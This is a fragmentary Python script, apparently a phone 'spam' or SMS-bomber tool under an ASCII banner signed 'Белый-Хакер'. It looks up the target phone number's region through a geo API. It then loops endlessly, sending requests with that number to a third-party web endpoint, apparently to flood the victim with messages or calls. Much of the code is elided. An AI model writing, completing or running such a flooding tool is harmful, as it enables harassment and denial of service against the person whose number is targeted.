...
======================================================||
      ...
      |    SS   PPPPPP  AAAAAA  MM           |
      |   SS    PP  PP  AA  AA  MMMMMMMMMM   |
      |     SS  PP      AAAAAA  MM  MM  MM   |
      |    SS	PP      AA  AA  MM  MM  MM   |
      |______________________________________|
        .::| By - .::Белый-Хакер::.  |::.
======================================================||
"""
...
phone = _phone
try:
    response = requests.get('https://htmlweb.ru/geo/api.php?json&telcod=' + _phone)
    data = response.json()
...
while True:
	...
	try:
		requests.get("https://solomolopolo112.000webhostapp.com/api/", params={"phone":_phone})
